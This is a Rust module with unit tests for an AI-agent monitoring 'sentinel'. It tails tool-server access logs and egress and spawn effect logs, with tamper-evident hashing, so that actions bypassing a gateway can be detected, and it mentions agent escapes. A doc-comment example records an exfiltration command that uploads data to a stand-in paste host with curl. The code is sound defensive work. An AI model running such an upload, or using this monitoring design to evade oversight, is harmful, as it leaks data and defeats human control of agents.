//! Reading observations out of what a real system already writes.
//!
//! The sentinel's detectors were a library with nothing feeding them. These
//! are the adapters: tailers over logs the surrounding system already keeps.
//!
//! # Why a log the system already writes
//!
//! Independence is the whole point. Evidence sealed by the gateway describes
//! what went through the gateway; an observation has to come from somewhere
//! else or it cannot show a bypass. A tool server's own access log qualifies
//! — it records what the server actually executed, whoever asked — and it
//! usually exists already, which matters because a sensor nobody deploys
//! detects nothing.
//!
//! # Two schemas, one tailer
//!
//! [`JsonlAccessLog`] reads tool invocations. [`JsonlEffectLog`] reads the
//! consequential effects that have no tool call behind them — network egress
//! and process spawns, as an egress proxy, socket monitor or exec audit trail
//! records them. That second sensor exists because
//! [`EffectConformanceDetector`](crate::detector::EffectConformanceDetector)
//! had nothing feeding it: egress and spawns carry no parameter digest, so
//! reconciliation cannot judge them, and until now nothing in this crate
//! could actually *see* one. A detector wired to no sensor catches nothing,
//! however good its arithmetic — and this is the effect class the July 2026
//! frontier-lab escapes actually used.
//!
//! Both are aliases of one generic [`JsonlSensorLog`], differing only in a
//! [`LineParser`]. Sharing the tailer is a safety property rather than
//! economy: the attestation mechanism requires the incremental poll and the
//! full [`JsonlSensorLog::deep_verify`] to compute the identical hash chain,
//! and two separately maintained tailers would eventually diverge. The new
//! sensor inherits checkpointing, liveness and tamper-evidence intact, so an
//! egress record cannot be edited out of the log after the fact any more
//! than a tool call can.
//!
//! # Incremental, and honest about restarts
//!
//! [`JsonlAccessLog`] tracks a byte offset and reads only what is new, so
//! patrolling every minute costs the delta rather than the file. A truncated
//! or replaced file resets the offset and is reported through
//! [`TailReport::rotated`] rather than being silently skipped: a log that
//! shrank is either rotation or tampering, and the sentinel is not the right
//! place to guess which.
//!
//! A partial trailing line is left unconsumed. The writer may still be
//! mid-append, and a half-written record parsed as a whole one is a
//! fabricated observation — worse than a late one.

use serde_json::Value;
use std::fs::File;
use std::io::{BufRead, BufReader, Seek, SeekFrom};
use std::marker::PhantomData;
use std::path::{Path, PathBuf};

use crate::attestation::{
    extend_stream_hash, stream_genesis, SensorCheckpoint, TamperedCheckpoint,
};
use crate::observation::{Effect, Observation, Subject};

/// One line of a tool server's access log.
///
/// The schema is deliberately small: what ran, with what arguments, for whom,
/// when. A server that logs more is welcome to; unknown fields are ignored.
///
/// ```json
/// {"id":"req-91","timestampUtc":"2026-08-27T12:00:20.000Z",
///  "tool":"send_command","arguments":{"command":"DEORBIT"},
///  "agentDid":"did:syntriass:agent:AGT-1"}
/// ```
///
/// `agentDid` may be absent — many servers cannot see one — and that is
/// recorded as [`Subject::Anonymous`] rather than guessed at.
#[derive(Debug, Clone, PartialEq)]
pub struct AccessLogLine {
    /// The server's own request id, cited in findings so an operator can find
    /// the raw line again.
    pub id: String,
    /// ISO-8601 UTC.
    pub timestamp_utc: String,
    /// Tool executed.
    pub tool: String,
    /// Arguments, as the server received them.
    pub arguments: Value,
    /// The caller's DID, when the server knows one.
    pub agent_did: Option<String>,
}

impl AccessLogLine {
    /// Parses one JSON line. `None` for anything that is not a complete,
    /// well-formed record — a malformed line is skipped rather than turned
    /// into a partial observation.
    pub fn parse(line: &str) -> Option<Self> {
        let value: Value = serde_json::from_str(line).ok()?;
        Some(Self {
            id: value.get("id")?.as_str()?.to_string(),
            timestamp_utc: value.get("timestampUtc")?.as_str()?.to_string(),
            tool: value.get("tool")?.as_str()?.to_string(),
            // Absent arguments are an empty object, not a missing record: a
            // no-argument call is ordinary and must still digest consistently
            // with the packet the gateway sealed for it.
            arguments: value
                .get("arguments")
                .cloned()
                .unwrap_or_else(|| serde_json::json!({})),
            agent_did: value
                .get("agentDid")
                .and_then(Value::as_str)
                .map(str::to_string),
        })
    }

    /// The observation this line represents, attributed to `sensor`.
    pub fn to_observation(&self, sensor: &str) -> Observation {
        Observation::tool_invocation(
            &self.id,
            sensor,
            &self.timestamp_utc,
            match &self.agent_did {
                Some(did) => Subject::Claimed(did.clone()),
                None => Subject::Anonymous,
            },
            &self.tool,
            &self.arguments,
        )
    }
}

/// How one JSONL line becomes an observation.
///
/// The tailer below owns everything that is not format-specific — byte
/// offsets, the running stream hash, rotation detection, deep verification —
/// and this is the single seam where a log's schema enters. Adding a sensor
/// means implementing this, not writing a second tailer.
///
/// That split is a safety property, not tidiness. [`crate::attestation`]
/// depends on the incremental poll and the full `deep_verify` computing the
/// *identical* chain; two tailers maintained separately would eventually
/// hash differently and the tamper detector would either cry wolf on clean
/// files or, worse, agree on tampered ones. There is one hashing path here
/// because there can only safely be one.
pub trait LineParser {
    /// Parses one trimmed, non-empty line into an observation attributed to
    /// `sensor`. `None` for anything that is not a complete, well-formed
    /// record; the tailer counts those rather than dropping them silently.
    fn parse_observation(line: &str, sensor: &str) -> Option<Observation>;
}

impl LineParser for AccessLogLine {
    fn parse_observation(line: &str, sensor: &str) -> Option<Observation> {
        Some(Self::parse(line)?.to_observation(sensor))
    }
}

/// One line of an effect log: what left the box, or what was executed.
///
/// The companion schema to [`AccessLogLine`], for the effects that have no
/// tool call behind them. `kind` discriminates:
///
/// ```json
/// {"id":"eg-1","timestampUtc":"2026-08-27T12:00:20.000Z","kind":"egress",
///  "destination":"paste.example.net:443","bytes":81920,
///  "agentDid":"did:syntriass:agent:AGT-1"}
/// {"id":"sp-1","timestampUtc":"2026-08-27T12:00:21.000Z","kind":"spawn",
///  "command":"/bin/sh -c curl -T /data paste.example.net"}
/// ```
///
/// Written by the things that already see this traffic: an egress proxy, a
/// socket-layer or eBPF monitor, an exec/audit trail. As with the access
/// log, `agentDid` may be absent — a proxy usually cannot see one — and that
/// is recorded as [`Subject::Anonymous`] rather than guessed at.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum EffectLogLine {
    /// Bytes left the trust boundary.
    Egress {
        /// The record's own id, cited in findings.
        id: String,
        /// ISO-8601 UTC.
        timestamp_utc: String,
        /// Host, or host:port, the bytes went to.
        destination: String,
        /// How many bytes.
        bytes: u64,
        /// The responsible DID, when the source knows one.
        agent_did: Option<String>,
    },
    /// A process was launched.
    Spawn {
        /// The record's own id, cited in findings.
        id: String,
        /// ISO-8601 UTC.
        timestamp_utc: String,
        /// The command line as executed.
        command: String,
        /// The responsible DID, when the source knows one.
        agent_did: Option<String>,
    },
}

impl EffectLogLine {
    /// Parses one JSON line, or `None` if it is not a complete record of a
    /// kind this sensor understands.
    ///
    /// An unrecognised `kind` is `None` rather than an error: effect logs are
    /// shared infrastructure and may carry records this sensor has no opinion
    /// about. They are counted as malformed, which is the honest reading —
    /// the sensor saw a line it could not turn into an observation, and a
    /// coverage claim should not quietly ignore that.
    pub fn parse(line: &str) -> Option<Self> {
        let value: Value = serde_json::from_str(line).ok()?;
        let id = value.get("id")?.as_str()?.to_string();
        let timestamp_utc = value.get("timestampUtc")?.as_str()?.to_string();
        let agent_did = value
            .get("agentDid")
            .and_then(Value::as_str)
            .map(str::to_string);

        match value.get("kind")?.as_str()? {
            "egress" => Some(Self::Egress {
                id,
                timestamp_utc,
                destination: value.get("destination")?.as_str()?.to_string(),
                // A refused or zero-length connection is still egress worth
                // judging — the destination is what the policy checks — so a
                // missing byte count is zero, not a rejected record.
                bytes: value.get("bytes").and_then(Value::as_u64).unwrap_or(0),
                agent_did,
            }),
            "spawn" => Some(Self::Spawn {
                id,
                timestamp_utc,
                command: value.get("command")?.as_str()?.to_string(),
                agent_did,
            }),
            _ => None,
        }
    }

    /// The observation this line represents, attributed to `sensor`.
    pub fn to_observation(&self, sensor: &str) -> Observation {
        let subject = |did: &Option<String>| match did {
            Some(did) => Subject::Claimed(did.clone()),
            None => Subject::Anonymous,
        };
        match self {
            Self::Egress {
                id,
                timestamp_utc,
                destination,
                bytes,
                agent_did,
            } => Observation::network_egress(
                id,
                sensor,
                timestamp_utc,
                subject(agent_did),
                destination,
                *bytes,
            ),
            Self::Spawn {
                id,
                timestamp_utc,
                command,
                agent_did,
            } => Observation::process_spawn(id, sensor, timestamp_utc, subject(agent_did), command),
        }
    }
}

impl LineParser for EffectLogLine {
    fn parse_observation(line: &str, sensor: &str) -> Option<Observation> {
        Some(Self::parse(line)?.to_observation(sensor))
    }
}

/// What one poll of a log yielded.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct TailReport {
    /// Observations parsed from the new lines.
    pub observations: Vec<Observation>,
    /// Lines that were not well-formed records. Counted rather than dropped
    /// silently: a sensor quietly discarding half a log is a sensor reporting
    /// a clean fleet for the wrong reason.
    pub malformed: usize,
    /// True when the file shrank or was replaced since the last poll.
    pub rotated: bool,
}

/// A tailer over a JSONL log, parameterised by the schema of its lines.
///
/// Everything here is format-agnostic; `P` supplies the one format-specific
/// step. Use the [`JsonlAccessLog`] and [`JsonlEffectLog`] aliases rather
/// than naming this directly.
pub struct JsonlSensorLog<P: LineParser = AccessLogLine> {
    path: PathBuf,
    sensor: String,
    /// Where this tailer started reading — 0 for [`JsonlAccessLog::new`],
    /// the file length at attach time for [`JsonlAccessLog::from_end`].
    /// Fixed at construction: it is the point the running stream hash
    /// starts from, and [`JsonlAccessLog::deep_verify`] must replay from
    /// exactly here or its recomputation is not comparable to what
    /// [`JsonlAccessLog::poll`] sealed.
    base_offset: u64,
    offset: u64,
    /// Running hash over every line consumed since `base_offset`. Starts at
    /// [`stream_genesis`] and is extended one line at a time by
    /// [`extend_stream_hash`] — never recomputed from scratch during a
    /// normal poll, so patrolling stays the cost of the delta.
    stream_tail_hash: String,
    /// Identity of the file the offset belongs to, where the platform
    /// exposes one. `None` before the first successful poll.
    identity: Option<FileIdentity>,
    parser: PhantomData<P>,
}

/// A tailer over a tool server's JSONL access log.
pub type JsonlAccessLog = JsonlSensorLog<AccessLogLine>;

/// A tailer over a JSONL effect log — an egress proxy, a socket or eBPF
/// monitor, an exec audit trail.
///
/// The sensor that feeds
/// [`EffectConformanceDetector`](crate::detector::EffectConformanceDetector).
/// Egress and process spawns carry no parameter digest, so reconciliation
/// against sealed packets cannot judge them and they were the one class of
/// consequential effect nothing in this crate could actually see. Because
/// this shares [`JsonlSensorLog`] with the access log it inherits the same
/// checkpointing and [`JsonlSensorLog::deep_verify`] tamper-evidence — an
/// egress record cannot be edited out of the log after the fact any more
/// than a tool call can.
pub type JsonlEffectLog = JsonlSensorLog<EffectLogLine>;

/// What distinguishes one file from another at the same path.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct FileIdentity {
    device: u64,
    inode: u64,
}

impl FileIdentity {
    /// Reads the identity of an open file, where the platform has one.
    ///
    /// `None` off Unix, where the tailer falls back to length alone and
    /// therefore cannot see a same-length rotation. Stated rather than
    /// papered over: the limitation is real on those platforms.
    #[cfg(unix)]
    fn of(file: &File) -> Option<Self> {
        use std::os::unix::fs::MetadataExt;
        let meta = file.metadata().ok()?;
        Some(Self {
            device: meta.dev(),
            inode: meta.ino(),
        })
    }

    #[cfg(not(unix))]
    fn of(_file: &File) -> Option<Self> {
        None
    }
}

impl<P: LineParser> JsonlSensorLog<P> {
    /// A tailer starting at the beginning of `path`.
    ///
    /// `sensor` must match the [`Sensor`](crate::observation::Sensor) name
    /// registered with the patrol, or its observations are treated as coming
    /// from an unvouched source — which caps what they can conclude.
    pub fn new(path: impl Into<PathBuf>, sensor: impl Into<String>) -> Self {
        Self {
            path: path.into(),
            sensor: sensor.into(),
            base_offset: 0,
            offset: 0,
            stream_tail_hash: stream_genesis(),
            identity: None,
            parser: PhantomData,
        }
    }

    /// Starts from the current end of the file, ignoring history.
    ///
    /// For attaching to a long-running server without re-reading a log whose
    /// evidence window has already been patrolled. The stream hash — and
    /// therefore what [`JsonlAccessLog::deep_verify`] can ever prove — only
    /// covers bytes from here forward; the sentinel is not attesting to
    /// history it never read.
    pub fn from_end(mut self) -> Result<Self, String> {
        let file = File::open(&self.path)
            .map_err(|e| format!("cannot open {}: {e}", self.path.display()))?;
        self.offset = file
            .metadata()
            .map_err(|e| format!("cannot stat {}: {e}", self.path.display()))?
            .len();
        self.base_offset = self.offset;
        // Recorded now so a rotation between here and the first poll is seen
        // as one, rather than as an offset into an unrelated file.
        self.identity = FileIdentity::of(&file);
        Ok(self)
    }

    /// The path being tailed.
    pub fn path(&self) -> &Path {
        &self.path
    }

    /// Bytes consumed so far.
    pub fn offset(&self) -> u64 {
        self.offset
    }

    /// Seals the current stream position: everything consumed so far,
    /// reduced to one hash. Call after a poll and hand the result to
    /// [`crate::patrol::Patrol::attest_sensor`] so it is sealed onto the
    /// sentinel's own chain the same way an enforcement action is.
    pub fn checkpoint(&self, now_utc: impl Into<String>) -> SensorCheckpoint {
        SensorCheckpoint {
            sensor: self.sensor.clone(),
            offset: self.offset,
            stream_tail_hash: self.stream_tail_hash.clone(),
            checkpointed_at_utc: now_utc.into(),
        }
    }

    /// Re-reads the file from this tailer's starting point and recomputes
    /// the running hash from scratch, checking it against every previously
    /// sealed checkpoint for this sensor.
    ///
    /// This is the only way this mechanism actually catches tampering: the
    /// incremental hash in [`JsonlAccessLog::poll`] only ever sees bytes
    /// once, so it would happily extend a chain over content an attacker
    /// swapped in *before* the tailer got to it. A deep verify is O(file
    /// size) rather than O(delta), which is why it belongs in a periodic
    /// integrity pass rather than every patrol — the same tradeoff the rest
    /// of the workspace makes explicit rather than hides: cheap incremental
    /// reads for throughput, an occasional full pass for the guarantee that
    /// actually matters.
    ///
    /// A checkpoint whose offset the current file cannot reach (it is now
    /// shorter) is reported too: truncation removes attested content just as
    /// surely as editing it does.
    pub fn deep_verify(
        &self,
        checkpoints: &[SensorCheckpoint],
    ) -> Result<Vec<TamperedCheckpoint>, String> {
        let mine: Vec<&SensorCheckpoint> = checkpoints
            .iter()
            .filter(|c| c.sensor == self.sensor)
            .collect();
        if mine.is_empty() {
            return Ok(Vec::new());
        }

        let file = match File::open(&self.path) {
            Ok(file) => file,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                // The file is gone. Every checkpoint past base_offset is
                // unreachable — total truncation is still truncation.
                return Ok(mine
                    .into_iter()
                    .map(|c| TamperedCheckpoint {
                        sensor: c.sensor.clone(),
                        offset: c.offset,
                        sealed_hash: c.stream_tail_hash.clone(),
                        recomputed_hash: "<file no longer exists>".to_string(),
                    })
                    .collect());
            }
            Err(e) => return Err(format!("cannot open {}: {e}", self.path.display())),
        };
        let mut reader = BufReader::new(file);
        reader
            .seek(SeekFrom::Start(self.base_offset))
            .map_err(|e| format!("cannot seek {}: {e}", self.path.display()))?;

        let mut tail = stream_genesis();
        let mut offset = self.base_offset;
        let mut found: Vec<(u64, String)> = Vec::new();
        let mut line = String::new();
        loop {
            line.clear();
            let read = reader
                .read_line(&mut line)
                .map_err(|e| format!("cannot read {}: {e}", self.path.display()))?;
            if read == 0 {
                break;
            }
            if !line.ends_with('\n') {
                // Same rule as poll(): an in-progress final line was never
                // sealed into a checkpoint, so it needs no verification.
                break;
            }
            offset += read as u64;
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            tail = extend_stream_hash(&tail, trimmed);
            found.push((offset, tail.clone()));
        }

        let mut tampered = Vec::new();
        for checkpoint in mine {
            match found.iter().find(|(o, _)| *o == checkpoint.offset) {
                Some((_, recomputed)) if recomputed == &checkpoint.stream_tail_hash => {}
                Some((_, recomputed)) => tampered.push(TamperedCheckpoint {
                    sensor: checkpoint.sensor.clone(),
                    offset: checkpoint.offset,
                    sealed_hash: checkpoint.stream_tail_hash.clone(),
                    recomputed_hash: recomputed.clone(),
                }),
                None => tampered.push(TamperedCheckpoint {
                    sensor: checkpoint.sensor.clone(),
                    offset: checkpoint.offset,
                    sealed_hash: checkpoint.stream_tail_hash.clone(),
                    recomputed_hash: "<file is now shorter than this checkpoint>".to_string(),
                }),
            }
        }
        Ok(tampered)
    }

    /// Reads everything appended since the last poll.
    ///
    /// A missing file is not an error: a server that has not written yet is
    /// ordinary, and treating it as a failure would make the first patrol of
    /// a fresh deployment fail for the wrong reason.
    pub fn poll(&mut self) -> Result<TailReport, String> {
        let mut report = TailReport::default();
        let file = match File::open(&self.path) {
            Ok(file) => file,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(report),
            Err(e) => return Err(format!("cannot open {}: {e}", self.path.display())),
        };
        let len = file
            .metadata()
            .map_err(|e| format!("cannot stat {}: {e}", self.path.display()))?
            .len();
        let identity = FileIdentity::of(&file);
        // A different file at the same path is rotation even when it happens
        // to be the same length — which a length check alone would miss, and
        // would then seek past real records.
        let replaced = match (self.identity, identity) {
            (Some(held), Some(current)) => held != current,
            _ => false,
        };
        if replaced || len < self.offset {
            // Restart from the beginning so nothing in the new file is
            // missed, and say so. The stream hash restarts too: a rotated
            // file is a new stream, and any checkpoint sealed against the
            // old one is no longer this tailer's to verify — it stays in
            // the sentinel's ledger as history, not as a live attestation.
            report.rotated = true;
            self.offset = 0;
            self.base_offset = 0;
            self.stream_tail_hash = stream_genesis();
        }
        self.identity = identity;

        let mut reader = BufReader::new(file);
        reader
            .seek(SeekFrom::Start(self.offset))
            .map_err(|e| format!("cannot seek {}: {e}", self.path.display()))?;

        let mut consumed = self.offset;
        let mut line = String::new();
        loop {
            line.clear();
            let read = reader
                .read_line(&mut line)
                .map_err(|e| format!("cannot read {}: {e}", self.path.display()))?;
            if read == 0 {
                break;
            }
            if !line.ends_with('\n') {
                // A partial trailing line: the writer may be mid-append.
                // Leave the offset before it so the next poll sees it whole.
                break;
            }
            consumed += read as u64;
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            // Every consumed line extends the stream hash, parsed or not —
            // this is about the bytes on disk, not their JSON validity. A
            // malformed line that later gets edited into a well-formed one
            // (or vice versa) is exactly the tampering deep_verify exists
            // to catch, and it can only catch what the chain covers.
            self.stream_tail_hash = extend_stream_hash(&self.stream_tail_hash, trimmed);
            match P::parse_observation(trimmed, &self.sensor) {
                Some(observation) => report.observations.push(observation),
                None => report.malformed += 1,
            }
        }
        self.offset = consumed;
        Ok(report)
    }
}

/// Reads sealed packets and anchors back out of a gateway's JSONL evidence
/// ledger.
///
/// The sentinel needs the ledger as well as the observations, and the
/// gateway's [`JsonlEvidenceSink`](../../ot_mcp_gateway/sink) writes
/// `{"kind":…,"record":…}` per line. Returns `(packets, anchors)` in file
/// order.
///
/// Malformed lines are skipped: a ledger that will not parse is a finding for
/// the chain-integrity detector to make from what *did* parse, not a reason
/// for the whole patrol to fail.
pub fn read_evidence_ledger(path: impl AsRef<Path>) -> Result<(Vec<Value>, Vec<Value>), String> {
    let text = match std::fs::read_to_string(path.as_ref()) {
        Ok(text) => text,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
        Err(e) => return Err(format!("cannot read {}: {e}", path.as_ref().display())),
    };
    let (mut packets, mut anchors) = (Vec::new(), Vec::new());
    for line in text.lines() {
        let Ok(entry) = serde_json::from_str::<Value>(line) else {
            continue;
        };
        let Some(record) = entry.get("record") else {
            continue;
        };
        match entry.get("kind").and_then(Value::as_str) {
            Some("packet") => packets.push(record.clone()),
            Some("anchor") => anchors.push(record.clone()),
            _ => {}
        }
    }
    Ok((packets, anchors))
}

/// Every consequential effect an [`Effect`] can represent, for reports.
pub fn describe_all(observations: &[Observation]) -> Vec<String> {
    observations
        .iter()
        .filter(|o| o.effect.is_consequential())
        .map(|o| format!("{} @ {}", o.effect.describe(), o.observed_at_utc))
        .collect()
}

/// True when an observation came from a tool invocation, as opposed to a
/// heartbeat or a read.
pub fn is_invocation(observation: &Observation) -> bool {
    matches!(observation.effect, Effect::ToolInvocation { .. })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::observation::digest_params;
    use serde_json::json;
    use std::io::Write;

    fn write(path: &Path, text: &str) {
        std::fs::write(path, text).unwrap();
    }

    fn append(path: &Path, text: &str) {
        let mut f = std::fs::OpenOptions::new().append(true).open(path).unwrap();
        f.write_all(text.as_bytes()).unwrap();
    }

    fn line(id: &str, tool: &str, args: Value, did: Option<&str>) -> String {
        let mut v = json!({
            "id": id,
            "timestampUtc": "2026-08-27T12:00:00.000Z",
            "tool": tool,
            "arguments": args,
        });
        if let Some(did) = did {
            v["agentDid"] = json!(did);
        }
        format!("{v}\n")
    }

    #[test]
    fn a_log_line_becomes_an_observation_whose_digest_matches_the_sealed_packet() {
        let record = AccessLogLine::parse(&line(
            "req-1",
            "send_command",
            json!({ "target": "ALL", "command": "DEORBIT" }),
            Some("did:syntriass:agent:AGT-1"),
        ))
        .expect("parses");
        let observation = record.to_observation("tool-server-log");
        assert_eq!(observation.id, "req-1");
        assert_eq!(
            observation.subject,
            Subject::Claimed("did:syntriass:agent:AGT-1".into())
        );
        // The digest is over canonical JSON, so the key order the server
        // happened to log in cannot stop the effect matching its evidence.
        let Effect::ToolInvocation { params_digest, .. } = &observation.effect else {
            panic!("expected a tool invocation");
        };
        assert_eq!(
            params_digest,
            &digest_params(&json!({ "command": "DEORBIT", "target": "ALL" }))
        );
    }

    #[test]
    fn a_line_with_no_agent_is_anonymous_rather_than_attributed_to_a_guess() {
        let record = AccessLogLine::parse(&line("req-2", "read_catalog", json!({}), None)).unwrap();
        assert_eq!(record.to_observation("s").subject, Subject::Anonymous);
    }

    #[test]
    fn missing_arguments_digest_as_an_empty_object() {
        let record = AccessLogLine::parse(
            r#"{"id":"r","timestampUtc":"2026-08-27T12:00:00.000Z","tool":"ping"}"#,
        )
        .unwrap();
        assert_eq!(record.arguments, json!({}));
    }

    #[test]
    fn an_incomplete_record_is_refused_rather_than_half_read() {
        for bad in [
            "",
            "not json",
            r#"{"id":"r"}"#,
            r#"{"timestampUtc":"t","tool":"x"}"#,
            r#"{"id":"r","tool":"x"}"#,
            r#"{"id":1,"timestampUtc":"t","tool":"x"}"#,
        ] {
            assert!(AccessLogLine::parse(bad).is_none(), "accepted {bad:?}");
        }
    }

    #[test]
    fn polling_reads_only_what_is_new() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("access.jsonl");
        write(&path, &line("r1", "read_catalog", json!({}), None));

        let mut tail = JsonlAccessLog::new(&path, "tool-server-log");
        let first = tail.poll().unwrap();
        assert_eq!(first.observations.len(), 1);
        assert!(!first.rotated);

        // Nothing appended: nothing returned, and no re-reading.
        assert!(tail.poll().unwrap().observations.is_empty());

        append(&path, &line("r2", "send_command", json!({ "c": 1 }), None));
        let second = tail.poll().unwrap();
        assert_eq!(second.observations.len(), 1);
        assert_eq!(second.observations[0].id, "r2");
    }

    #[test]
    fn a_partial_trailing_line_waits_for_the_writer_to_finish_it() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("access.jsonl");
        write(&path, &line("r1", "read_catalog", json!({}), None));
        // The writer is mid-append.
        append(
            &path,
            r#"{"id":"r2","timestampUtc":"2026-08-27T12:00:01.000Z","to"#,
        );

        let mut tail = JsonlAccessLog::new(&path, "s");
        let first = tail.poll().unwrap();
        assert_eq!(first.observations.len(), 1);
        assert_eq!(first.malformed, 0, "a half-written line was parsed");

        // The writer finishes it.
        append(&path, "ol\":\"send_command\",\"arguments\":{}}\n");
        let second = tail.poll().unwrap();
        assert_eq!(second.observations.len(), 1);
        assert_eq!(second.observations[0].id, "r2");
    }

    #[test]
    fn rotation_is_reported_and_the_new_file_is_read_from_the_start() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("access.jsonl");
        write(&path, &line("r1", "read_catalog", json!({}), None));
        let mut tail = JsonlAccessLog::new(&path, "s");
        assert_eq!(tail.poll().unwrap().observations.len(), 1);

        // Rotated to a *shorter* file.
        write(&path, "{}\n");
        let after = tail.poll().unwrap();
        assert!(after.rotated, "a shrinking file went unreported");
    }

    #[test]
    fn a_same_length_rotation_is_still_caught() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("access.jsonl");
        // Both tool names are twelve characters, so the two files are byte-
        // identical in length. A length check alone would seek straight past
        // the new record and report nothing — the dangerous direction.
        write(&path, &line("r1", "read_catalog", json!({}), None));
        let mut tail = JsonlAccessLog::new(&path, "s");
        assert_eq!(tail.poll().unwrap().observations.len(), 1);

        // Rotated the way logrotate and atomic writers do it: build the
        // replacement elsewhere and rename it over. Deleting and recreating
        // in place can reuse the inode, which would make this test pass or
        // fail on filesystem allocation luck rather than on the logic.
        let replacement = dir.path().join("rotated.jsonl");
        write(&replacement, &line("r2", "send_command", json!({}), None));
        std::fs::rename(&replacement, &path).unwrap();
        let after = tail.poll().unwrap();
        assert!(after.rotated, "a same-length rotation went unreported");
        assert_eq!(after.observations.len(), 1, "the new record was skipped");
        assert_eq!(after.observations[0].id, "r2");
    }

    #[test]
    fn malformed_lines_are_counted_rather_than_silently_dropped() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("access.jsonl");
        write(
            &path,
            &format!(
                "{}garbage\n\n{}",
                line("r1", "read_catalog", json!({}), None),
                line("r2", "send_command", json!({}), None)
            ),
        );
        let report = JsonlAccessLog::new(&path, "s").poll().unwrap();
        assert_eq!(report.observations.len(), 2);
        assert_eq!(report.malformed, 1);
    }

    #[test]
    fn a_log_that_does_not_exist_yet_is_empty_rather_than_an_error() {
        let dir = tempfile::tempdir().unwrap();
        let mut tail = JsonlAccessLog::new(dir.path().join("not-written-yet.jsonl"), "s");
        assert_eq!(tail.poll().unwrap(), TailReport::default());
    }

    #[test]
    fn starting_from_the_end_skips_history() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("access.jsonl");
        write(&path, &line("old", "read_catalog", json!({}), None));
        let mut tail = JsonlAccessLog::new(&path, "s").from_end().unwrap();
        assert!(tail.poll().unwrap().observations.is_empty());
        append(&path, &line("new", "send_command", json!({}), None));
        assert_eq!(tail.poll().unwrap().observations[0].id, "new");
    }

    #[test]
    fn an_evidence_ledger_splits_into_packets_and_anchors() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("evidence.jsonl");
        write(
            &path,
            "{\"kind\":\"anchor\",\"record\":{\"n\":1}}\n\
             {\"kind\":\"packet\",\"record\":{\"n\":2}}\n\
             not json\n\
             {\"kind\":\"anchor\",\"record\":{\"n\":3}}\n",
        );
        let (packets, anchors) = read_evidence_ledger(&path).unwrap();
        assert_eq!(packets, [json!({ "n": 2 })]);
        assert_eq!(anchors, [json!({ "n": 1 }), json!({ "n": 3 })]);

        // A ledger that does not exist is empty, not an error.
        let (p, a) = read_evidence_ledger(dir.path().join("nothing.jsonl")).unwrap();
        assert!(p.is_empty() && a.is_empty());
    }

    // ── Effect log ───────────────────────────────────────────────────────

    #[test]
    fn an_egress_line_becomes_an_egress_observation() {
        let line = r#"{"id":"eg-1","timestampUtc":"2026-08-27T12:00:20.000Z",
            "kind":"egress","destination":"paste.example.net:443","bytes":81920,
            "agentDid":"did:ot:agent"}"#;
        let observation = EffectLogLine::parse_observation(line, "egress-proxy").expect("parses");
        assert_eq!(observation.id, "eg-1");
        assert_eq!(observation.sensor, "egress-proxy");
        assert_eq!(observation.subject.did(), Some("did:ot:agent"));
        assert_eq!(
            observation.effect,
            Effect::NetworkEgress {
                destination: "paste.example.net:443".into(),
                bytes: 81920,
            }
        );
    }

    #[test]
    fn a_spawn_line_becomes_a_spawn_observation() {
        let line = r#"{"id":"sp-1","timestampUtc":"2026-08-27T12:00:21.000Z",
            "kind":"spawn","command":"/bin/sh -c curl"}"#;
        let observation = EffectLogLine::parse_observation(line, "exec-monitor").expect("parses");
        assert_eq!(
            observation.effect,
            Effect::ProcessSpawn {
                command: "/bin/sh -c curl".into()
            }
        );
    }

    #[test]
    fn a_proxy_that_cannot_see_a_did_reports_anonymous_rather_than_guessing() {
        let line = r#"{"id":"eg-2","timestampUtc":"2026-08-27T12:00:20.000Z",
            "kind":"egress","destination":"evil.example","bytes":1}"#;
        let observation = EffectLogLine::parse_observation(line, "egress-proxy").expect("parses");
        assert_eq!(observation.subject, Subject::Anonymous);
        // Anonymous egress is still consequential — the whole point is that
        // it gets judged rather than skipped for lacking an owner.
        assert!(observation.effect.is_consequential());
    }

    #[test]
    fn a_refused_connection_with_no_byte_count_is_still_judged() {
        // An egress proxy logging a blocked attempt often reports no bytes.
        // The destination is what the policy checks, so dropping the record
        // would hide exactly the connection that was interesting.
        let line = r#"{"id":"eg-3","timestampUtc":"2026-08-27T12:00:20.000Z",
            "kind":"egress","destination":"blocked.example"}"#;
        let observation = EffectLogLine::parse_observation(line, "egress-proxy").expect("parses");
        assert_eq!(
            observation.effect,
            Effect::NetworkEgress {
                destination: "blocked.example".into(),
                bytes: 0,
            }
        );
    }

    #[test]
    fn an_unrecognised_kind_is_not_silently_turned_into_something_else() {
        let line = r#"{"id":"x-1","timestampUtc":"2026-08-27T12:00:20.000Z",
            "kind":"dns-query","destination":"example.net"}"#;
        assert!(EffectLogLine::parse(line).is_none());
    }

    #[test]
    fn an_egress_record_missing_its_destination_is_refused() {
        // Without a destination there is nothing for the policy to check, so
        // admitting the record would manufacture an unjudgeable observation.
        let line = r#"{"id":"eg-4","timestampUtc":"2026-08-27T12:00:20.000Z",
            "kind":"egress","bytes":10}"#;
        assert!(EffectLogLine::parse(line).is_none());
    }

    #[test]
    fn the_effect_tailer_counts_records_it_cannot_use_rather_than_dropping_them() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("effects.jsonl");
        std::fs::write(
            &path,
            concat!(
                r#"{"id":"eg-1","timestampUtc":"t","kind":"egress","destination":"a.example","bytes":1}"#,
                "\n",
                r#"{"id":"x","timestampUtc":"t","kind":"dns-query"}"#,
                "\n",
                "not json at all\n",
            ),
        )
        .unwrap();

        let mut tail = JsonlEffectLog::new(&path, "egress-proxy");
        let report = tail.poll().unwrap();
        assert_eq!(report.observations.len(), 1);
        assert_eq!(report.malformed, 2, "unusable lines must be counted");
    }

    #[test]
    fn the_effect_tailer_hashes_its_stream_the_same_way_the_access_tailer_does() {
